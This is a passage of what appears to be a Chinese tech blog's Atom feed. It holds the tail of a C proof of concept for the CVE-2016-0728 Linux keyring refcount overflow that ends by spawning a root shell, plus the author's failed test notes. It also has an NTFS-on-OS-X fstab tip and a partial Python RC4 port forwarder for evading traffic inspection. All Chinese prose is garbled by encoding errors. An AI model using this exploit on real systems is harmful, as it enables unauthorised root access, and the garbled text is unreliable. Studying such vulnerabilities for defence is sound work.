class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ï¼Œè¿è¡Œ</p><p>æ­¤æ—¶æŸ¥çœ‹/proc/keysçš„å†…å®¹å¯ä»¥çœ‹åˆ°keyringçš„å¼•ç”¨è®¡æ•°åœ¨å˜åŒ–(ubuntu14ä¸‹æ˜¯æ— è§„åˆ™å˜åŠ¨O_Oï¼Œå…¶ä»–ç³»ç»Ÿæ­£å¸¸)</p><p>ç»è¿‡æ¼«é•¿çš„ç­‰å¾…ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p><p>å¹¶æ²¡æœ‰å¾—åˆ°rootã€‚ã€‚ã€‚</p><p>åˆ†åˆ«åœ¨ubuntu14ã€centos6.5ã€centos7.0ã€kaliç­‰å¹³å°çš„è™šæ‹Ÿæœºé‡Œå°è¯•ï¼Œéƒ½æ²¡æœ‰æˆåŠŸææƒã€‚ã€‚ã€‚çŒœæµ‹æ˜¯å› ä¸ºè™šæ‹Ÿæœºå†…å­˜çš„é‡Šæ”¾å’Œåˆ†é…å—å…¶ä»–å› ç´ å½±å“æ¯”è¾ƒå‰å®³ï¼Œä¸€ç›´æ— æ³•ä½¿ç›®æ ‡å‡½æ•°æŒ‡é’ˆåˆ†é…åˆ°æ­£ç¡®çš„ä½ç½®ã€‚ä¸€æ€’ä¹‹ä¸‹æŠŠå‡½æ•°åœ°å€åˆ†åˆ«æ”¹æˆ0x0å’Œ0x1ï¼Œå‡ºç° Ubuntuå‘ç”Ÿä¸¥é‡é”™è¯¯éœ€è¦é‡å¯ çš„å¯¹è¯æ¡†ï¼Œçœ‹èµ·æ¥æ˜¯æœ‰è¢«è°ƒç”¨çš„æ ·å­ã€‚ã€‚<br>å¦ï¼Œæ ¹æ®googleçš„ä¸€ä»½å¯¹åº”armä¸Šå®‰å“çš„ä»£ç (ç”¨syscallä»£æ›¿äº†ä¸€äº›api)ç¼–è¯‘äº†å®‰å“ä¸Šçš„pocï¼Œå°è¯•åœ¨CM12ä¸‹çš„ä¸€åŠ æ‰‹æœºä¸Šè¿è¡Œï¼š</p><img src="/2016/01/27/2016-01-27/1.pic.jpg" class=""><p>ç®—äº†ä¸‹ï¼ŒæŒ‰è¿™é€Ÿåº¦ä¼°è®¡å¾—è·‘ä¸ªä¸ªæŠŠæœˆã€‚<br>(å¦ï¼Œç¬¬äºŒå¤©è§£é”æ‰‹æœºå‘ç°è¿›åº¦åœ¨0.018%ï¼Œä¼°è®¡æœ‰ç”Ÿä¹‹å¹´è·‘ä¸å®Œäº† T_T )ã€‚</p><p>ç”±äºå®è·µå¤±è´¥å¹¶æ²¡æœ‰å‡ºçœŸçŸ¥ï¼Œå› æ­¤åº¦è¿‡äº†ä¸€ä¸ªä¸æ„‰å¿«çš„å‘¨æœ«ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸Šå‘¨æœ«çœ‹äº†ä¸‹&lt;strong&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=&quot; title=&quot;http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/&quot;&gt;cve-2016-0728&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/strong&gt; linuxæœ¬åœ°ææƒæ¼æ´ï¼Œä»Šå¤©è®°å½•ä¸€ä¸‹ã€‚&lt;br&gt;è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯å› ä¸ºkeyringså†…æ ¸ç»„ä»¶çš„å¼•ç”¨æ³„éœ²å¼•èµ·çš„ã€‚&lt;br&gt;æ­¤å†…æ ¸å¯¹è±¡é‡‡ç”¨ä¸€ä¸ª32ä½æ— ç¬¦å·æ•´æ•°åšå¼•ç”¨è®¡æ•°ï¼Œä½†åœ¨å¼•ç”¨è®¡æ•°æº¢å‡ºçš„æ—¶å€™æ²¡æœ‰è¿›è¡Œåˆç†çš„é”™è¯¯å¤„ç†ï¼Œæ‰€ä»¥å½“å¯¹æ­¤å¯¹è±¡å¼•ç”¨åˆ°è¾¾4Gæ—¶ä¼šä½¿å¼•ç”¨è®¡æ•°å›åˆ°0ï¼Œå†…æ ¸åœ¨æ£€æµ‹åˆ°æ­¤å¼•ç”¨è®¡æ•°ä¸º0æ—¶ä¼šææ„å¯¹è±¡é‡Šæ”¾ç©ºé—´ã€‚è€Œæ­¤æ—¶r3ç¨‹åºè¿˜ä¿ç•™æœ‰å†…æ ¸å¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æ­¤å°±å½¢æˆäº†ä¸€ä¸ªUAFæ¼æ´ã€‚&lt;br&gt;å°è±¡ä¸­è¿™ç§æ•´å½¢æº¢å‡ºé€ æˆçš„ä¸¥é‡æ¼æ´è¿˜çœŸä¸å°‘ï¼Œæœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„æ€åº¦å®è·µä¸€ä¸‹ã€‚&lt;br&gt;&lt;strong&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8=&quot; title=&quot;http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/&quot;&gt;åŸæ–‡&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/strong&gt;ä¸­æåˆ°ï¼š&lt;br&gt;â€œAddresses of commit_creds and prepare_kernel_cred functions are static and can be determined per Linux kernel version/android device.â€&lt;br&gt;æ‰€ä»¥å…ˆå†™äº†ä¸ªå†…æ ¸æ¨¡å—è·å–è¿™ä¿©å‡½æ•°çš„åœ°å€ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="ubuntu" scheme="https://badb100d.com/tags/ubuntu/"/>
    
      <category term="vulns" scheme="https://badb100d.com/tags/vulns/"/>
    
  </entry>
  
  <entry>
    <title>osxè¯»å†™ntfs</title>
    <link href="https://badb100d.com/2016/01/24/2016-01-24/"/>
    <id>https://badb100d.com/2016/01/24/2016-01-24/</id>
    <published>2016-01-24T11:05:00.000Z</published>
    <updated>2016-01-24T11:05:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä½œä¸ºå›½é™…å¤§å‚ï¼Œè‹¹æœæ•…æ„ä¸æ”¯æŒå·¨ç¡¬å®¶çš„ntfsæ–‡ä»¶ç³»ç»Ÿæœªå…æœ‰ç‚¹å°å¿ƒçœ¼ã€‚<br>å‡äº†el capitanåå¸Œæ·è‡ªå®¶çš„ntfsæ”¯æŒè½¯ä»¶ä¸èƒ½ç”¨äº†ï¼Œåªå¥½å¯»æ±‚å…¶ä»–å†™å…¥ntfsçš„æ–¹å¼ã€‚<br>googleä¸€ç•ªæ‰¾åˆ°äº†ä¸ªä¸ç®—ä¼˜é›…ä½†è¿˜å‡‘åˆçš„æ–¹æ¡ˆï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚</p><p>æ¥å…¥ntfsç§»åŠ¨ç¡¬ç›˜root shellç¼–è¾‘/etc/fstabå†…å®¹<br>å¦‚ï¼š<br>LABEL=DRIVE_NAME none ntfs rw,auto,nobrowse<br>å…¶ä¸­DRIVE_NAMEæ˜¯è¿å…¥è®¾å¤‡çš„å·æ ‡ï¼Œæ³¨æ„è‹¥å·æ ‡å«ç©ºæ ¼åˆ™ä½¿ç”¨â€œ\ â€è½¬ä¹‰ç¬¦ã€‚<br>æ­¤æ—¶é‡è¿è®¾å¤‡å¯åœ¨/Volumesä¸‹çœ‹åˆ°å·ã€‚<br>è¿™ç§æ–¹æ³•æ— æ³•åœ¨GUIç¯å¢ƒè¯»å†™ç£ç›˜æ–‡ä»¶ï¼Œä½†æ˜¯èƒ½åœ¨ç»ˆç«¯ä¸‹æ“ä½œï¼Œåªèƒ½è¯´å‡‘åˆèƒ½ç”¨ã€‚ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä½œä¸ºå›½é™…å¤§å‚ï¼Œè‹¹æœæ•…æ„ä¸æ”¯æŒå·¨ç¡¬å®¶çš„ntfsæ–‡ä»¶ç³»ç»Ÿæœªå…æœ‰ç‚¹å°å¿ƒçœ¼ã€‚&lt;br&gt;å‡äº†el capitanåå¸Œæ·è‡ªå®¶çš„ntfsæ”¯æŒè½¯ä»¶ä¸èƒ½ç”¨äº†ï¼Œåªå¥½å¯»æ±‚å…¶ä»–å†™å…¥ntfsçš„æ–¹å¼ã€‚&lt;br&gt;googleä¸€ç•ªæ‰¾åˆ°äº†ä¸ªä¸ç®—ä¼˜é›…ä½†è¿˜å‡‘åˆçš„æ–¹æ¡ˆï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="tools" scheme="https://badb100d.com/tags/tools/"/>
    
      <category term="osx" scheme="https://badb100d.com/tags/osx/"/>
    
      <category term="macos" scheme="https://badb100d.com/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>python asyncoreå®ç°ç«¯å£è½¬å‘</title>
    <link href="https://badb100d.com/2015/10/01/2015-10-01/"/>
    <id>https://badb100d.com/2015/10/01/2015-10-01/</id>
    <published>2015-10-01T09:28:00.000Z</published>
    <updated>2015-10-01T09:28:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘Digital Oceançš„VPSç›´è¿ä¸€ç›´è¿ä¸ä¸Šï¼Œæ€€ç–‘æ˜¯åŠŸå¤«ç‹æ ¹æ®sshçš„æµé‡ç‰¹å¾åšäº†æ‹¦æˆªï¼Œé‚å†™äº†ä¸ªè„šæœ¬å®ç°RC4åŠ å¯†çš„ç«¯å£è½¬å‘(ä¸»è¦ç›®çš„æ˜¯è§„é¿æµé‡ç‰¹å¾çš„åˆ†æ)ã€‚<br>pythonçš„asyncoreåº“æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„socketé€šä¿¡åº“ã€‚<br>ä¸€ä¸ªç®€å•çš„ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncore, socket</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPClient</span>(<span class="params">asyncore.dispatcher</span>):</span>              <span class="comment"># ç»§æ‰¿dispatcherç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, path</span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">                                                    <span class="comment"># è¿™ä¸ªç¤ºä¾‹æ˜¯clientç«¯</span></span><br><span class="line">        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.connect( (host, <span class="number">80</span>) )</span><br><span class="line">        self.buffer = <span class="string">&#x27;GET %s HTTP/1.0\r\n\r\n&#x27;</span> % path</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_connect</span>(<span class="params">self</span>):</span>                       <span class="comment"># æ­¤æˆå‘˜åœ¨è¿æ¥æˆåŠŸæ—¶è¢«è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                         <span class="comment"># è¿œç¨‹å…³é—­æ—¶è¢«è°ƒç”¨</span></span><br><span class="line">        self.close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                          <span class="comment"># é»˜è®¤æƒ…å†µä¸‹loopä¼šå¾ªç¯è°ƒç”¨æ­¤å‡½æ•°ï¼Œå¯è‡ªå®šä¹‰readableæˆå‘˜å®ç°æ¡ä»¶æ§åˆ¶</span></span><br><span class="line">        <span class="built_in">print</span> self.recv(<span class="number">8192</span>)                       <span class="comment"># åº”è¯¥ä¼šé˜»å¡åœ¨è¿™</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                             <span class="comment"># å¯å‘é€çš„æ¡ä»¶æ§åˆ¶æˆå‘˜</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buffer) &gt; <span class="number">0</span>)               <span class="comment"># å½“å‘é€é˜Ÿåˆ—ä¸ä¸ºç©ºæ—¶</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                         <span class="comment"># å‘é€æ“ä½œè°ƒç”¨çš„å›è°ƒ</span></span><br><span class="line">        sent = self.send(self.buffer)</span><br><span class="line">        self.buffer = self.buffer[sent:]</span><br><span class="line">client = HTTPClient(<span class="string">&#x27;www.python.org&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">asyncore.loop()                                     <span class="comment"># æ­¤è°ƒç”¨ä¼šåœ¨asyncoreå†…éƒ¨å¼€å§‹å¼‚æ­¥é€šä¿¡</span></span><br></pre></td></tr></table></figure><p>dispatcherçˆ¶ç±»ä¸­handleå¼€å¤´çš„æˆå‘˜éƒ½æ˜¯å›è°ƒç±»ï¼Œå¯åœ¨å­ç±»ä¸­å®šä¹‰å›è°ƒå‡½æ•°ã€‚</p><p>åœ¨ç½‘ä¸ŠæŸ¥äº†ä¸€äº›ç±»ä¼¼çš„ç¨‹åºéƒ½æ„Ÿè§‰ä»£ç å†™çš„ä¸æ˜¯å¾ˆå¥½ï¼Œäºæ˜¯è‡ªå·±æŸ¥äº†ä¸‹manualé‡æ–°é€ äº†éè½®å­ï¼Œå‘ç°è¿˜æ˜¯æŒºåˆ«æ‰­ğŸ˜‚<br>å¤§è‡´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket,asyncore,sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line">DEBUG=<span class="literal">False</span></span><br><span class="line">cipher_rc4_obj=<span class="literal">None</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transmiter</span>(<span class="params">asyncore.dispatcher</span>):</span>                  <span class="comment">#æ•°æ®äº¤æ¢ç±»</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ•°æ®äº¤æ¢ç±»,ä¸¤ä¸ªæ­¤ç±»çš„å®ä¾‹å¯äº’æ¢txå’Œrx,è‹¥åˆå§‹åŒ–socketåˆ™è¡¨ç¤ºserver,å¦åˆ™æ˜¯client&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,socket_info,transmitee=<span class="literal">None</span></span>):</span>     </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;å‚æ•°ä¸ºsocket_info,å¦ä¸€ä¸ªäº¤æ¢å®ä¾‹&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;(ä½œä¸ºclientæ—¶socket_infoä¸ºtuple(ip,port)ï¼Œä½œä¸ºserveræ—¶socket_infoä¸ºacceptå¾—åˆ°çš„socket)&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;ä¾‹å¦‚Transmiter((12.34.56.78,8080),transee)å®ä¾‹åŒ–äº†ä¸€ä¸ªclientç«¯&#x27;&#x27;&#x27;</span>\</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;Transmiter(socket_acptd,transee)å®ä¾‹åŒ–äº†ä¸€ä¸ªserverç«¯&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.buf_Tx=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.buf_Rx=<span class="string">&#x27;&#x27;</span>                                              <span class="comment"># Reserved</span></span><br><span class="line">        self.transmitee=transmitee                                  <span class="comment"># transmiteeæ˜¯è¦ä¸ä¹‹äº¤æ¢æ•°æ®çš„å¦ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=transmitee <span class="keyword">and</span> <span class="literal">None</span>==transmitee.transmitee:</span><br><span class="line">            transmitee.transmitee=self                              <span class="comment"># transmiteeä¸æœ¬å®ä¾‹äº¤æ¢æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(socket_info,socket.socket):                   <span class="comment"># server</span></span><br><span class="line">            asyncore.dispatcher.__init__(self,socket_info)</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer server&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">0</span>],<span class="built_in">str</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(socket_info[<span class="number">1</span>],<span class="built_in">int</span>):</span><br><span class="line">            asyncore.dispatcher.__init__(self)                      <span class="comment"># client</span></span><br><span class="line">            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># å»ºç«‹å¥—æ¥å­—</span></span><br><span class="line">            self.connect(socket_info)                               <span class="comment"># (ip,port)</span></span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer client&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_read</span>(<span class="params">self</span>):</span>                  <span class="comment"># è¯»å¤„ç†:recvå¹¶åŠ å…¥transeeçš„å‘é€é˜Ÿåˆ—æˆ–ä¸¢å¼ƒæ•°æ®</span></span><br><span class="line">        read = self.recv(<span class="number">4096</span>)              <span class="comment"># æœ‰æ•°æ®å¯è¯»æ—¶å°†è¯»å–çš„æ•°æ®åŠ å…¥transeeçš„å‘é€é˜Ÿåˆ—ï¼Œæ— transeeåˆ™ä¸¢å¼ƒ</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Read\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.buf_Tx += read</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Drop\t%d bytes&#x27;</span> % (<span class="built_in">len</span>(read))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">writable</span>(<span class="params">self</span>):</span>                     <span class="comment"># å¯å†™åˆ¤æ–­:æ£€æµ‹selfçš„å‘é€é˜Ÿåˆ—æ˜¯å¦æœ‰æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">len</span>(self.buf_Tx) &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_write</span>(<span class="params">self</span>):</span>                 <span class="comment"># å†™å¤„ç†:sendå‘é€é˜Ÿåˆ—ï¼Œä¿ç•™æœªå‘é€æˆåŠŸçš„éƒ¨åˆ†</span></span><br><span class="line">        sent = self.send(self.buf_Tx)</span><br><span class="line">        self.buf_Tx = self.buf_Tx[sent:]</span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer Write\t%d bytes&#x27;</span> % (sent)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_close</span>(<span class="params">self</span>):</span>                 <span class="comment"># å…³é—­çŠ¶æ€å¤„ç†ï¼Œå…³é—­selfåŠtransee</span></span><br><span class="line">        self.close()                        <span class="comment"># è¿œç«¯å…³é—­åå…³é—­è¿æ¥</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer close&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">None</span>!=self.transmitee:</span><br><span class="line">            self.transmitee.close()</span><br><span class="line">            <span class="keyword">if</span> DEBUG:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Transer\&#x27;s transee close&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_error</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer error occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_expt</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Transer exception occur&#x27;</span></span><br><span class="line">        self.handle_close()</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connector</span>(<span class="params"><span class="built_in">object</span></span>):</span>        <span class="comment"># å¦‚æœæ–­å¼€ä¸å¤ªå¥½é‡æ–°å»ºç«‹è¿æ¥</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,remoteaddr1,remoteaddr2</span>):</span></span><br><span class="line">        self.remoteaddr1=remoteaddr1</span><br><span class="line">        self.remoteaddr2=remoteaddr2</span><br><span class="line">        self.trans1=Transmiter(remoteaddr1)</span><br><span class="line">        self.trans2=Transmiter(remoteaddr2,self.trans1)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listener</span>(<span class="params">asyncore.dispatcher</span>):</span>        <span class="comment"># ä¸¤ä¸ªacceptedç»„æˆä¸€å¯¹trans</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,localaddr,backlog=<span class="number">5</span></span>):</span></span><br><span class="line">        asyncore.dispatcher.__init__(self)</span><br><span class="line">        self.lasttrans=<span class="literal">None</span></span><br><span class="line">        self.create_socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        